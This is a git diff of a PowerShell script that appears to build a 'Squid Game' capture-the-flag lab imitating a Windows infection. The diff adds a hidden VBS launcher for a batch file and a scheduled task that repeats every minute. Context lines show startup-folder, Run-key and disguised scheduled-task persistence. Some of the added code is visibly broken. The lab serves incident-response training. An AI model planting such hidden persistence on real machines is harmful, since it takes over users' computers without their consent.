@@ -373,13 +373,21 @@ copy "C:\Users\Public\Pictures\ghidra.ico" "%USERPROFILE%\Desktop\red+light_%ran
 timeout /t 1 >nul
 goto loop
 '@
-#lol
+
+$launcherBatIcon = @'
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "cmd.exe /c stealth.bat", 0, False
+'@
+#iconBoom
     $batPath = Join-Path $env:TEMP "icon_boom.bat"
     $batContent | Out-File -FilePath $batPath -Encoding ASCII
 
+$launcherBatIcon | Join-Path $env:APPDATA "456.vbs"
+$launcherBatIcon | Out-File -FilePath $batPath -Encoding ASCII
+
     # === 2. Try to schedule it via Task Scheduler (no admin needed for user tasks) ===
     try {
-        $action   = New-ScheduledTaskAction   -Execute $batPath
+        $action   = New-ScheduledTaskAction   -Execute $launcherBatIcon
         $trigger  = New-ScheduledTaskTrigger  -Once -At (Get-Date).AddMinutes(1) `
                       -RepetitionInterval (New-TimeSpan -Minutes 1)
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries `
@@ -532,6 +540,7 @@ catch {
         "C:\Users\Public\squid_log.txt",
         "$env:TEMP\squid_cache.dat",
         "$env:APPDATA\squid_config.ini",
+        "$env:APPDATA\456.vbs",
         "$env:TEMP\icon_boom.bat",
         "$env:TEMP\squid_boom.bat",
         "C:\Users\Public\Pictures\ghidra.ico"
@@ -583,6 +592,7 @@ function Get-Answers {
     Write-Host "   - $env:TEMP\squid_popup.vbs" -ForegroundColor White
     Write-Host "   - $env:TEMP\icon_boom.bat" -ForegroundColor White
     Write-Host "   - $startupPath\icon_explosion.bat" -ForegroundColor White
+    Write-Host "   - $env:APPDATA\456.vbs" -ForegroundColor White
 
     
     Write-Host "`n4. Scheduled Tasks:" -ForegroundColor Yellow
@@ -600,16 +610,16 @@ function Get-Answers {
 
 function Get-Flags {
     Write-Host "=== SQUID GAME CTF - ANSWERS ===" -ForegroundColor Red
-    Write-Host "`n🚩 COMPLETE FLAG:" -ForegroundColor Yellow
+    Write-Host "`n🚩 OBJECTIVES:" -ForegroundColor Yellow
+    Write-Host "   Restore your Computer to normal functionality, remove all traces of the infection"
+    Write-Host "`n🚩 SECRET FLAG:" -ForegroundColor Yellow
+    Write-Host " There is also a hidden flag hidden within the application, see if you can find it"
     Write-Host "   SQUID{P3RS1ST3NC3_1S_K3Y_T0_V1CT0RY}" -ForegroundColor White
     
     Write-Host "`n🔧 REMOVAL STEPS:" -ForegroundColor Green
-    Write-Host "1. Delete from Startup: $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\squid_game.vbs" -ForegroundColor Gray
-    Write-Host "2. Remove Registry Run: HKCU\Software\Microsoft\Windows\CurrentVersion\Run - SquidGameWatcher" -ForegroundColor Gray
-    Write-Host "3. Clear Sound Setting: HKCU\AppEvents\Schemes\Apps\.Default\Minimize\.Current" -ForegroundColor Gray
-    Write-Host "4. Delete Flag Registry: HKCU\Software\SquidGameCTF" -ForegroundColor Gray
-    Write-Host "5. Remove scheduled task: Notepad++\Updates\SquidPopups" -ForegroundColor Gray
-    Write-Host "6. Remove all files from $env:TEMP\ with 'squid' in name" -ForegroundColor Gray
+    Write-Host "1. Look for suspiciou files being dropped at the common locations" -ForegroundColor Gray
+    Write-Host "2. Look for RegKeys that were added/modified by the Virus" -ForegroundColor Gray
+    Write-Host "3. Look for schdule tasks and other methods of persistency" -ForegroundColor Gray
 }
 
 function Get-CTFHelp {
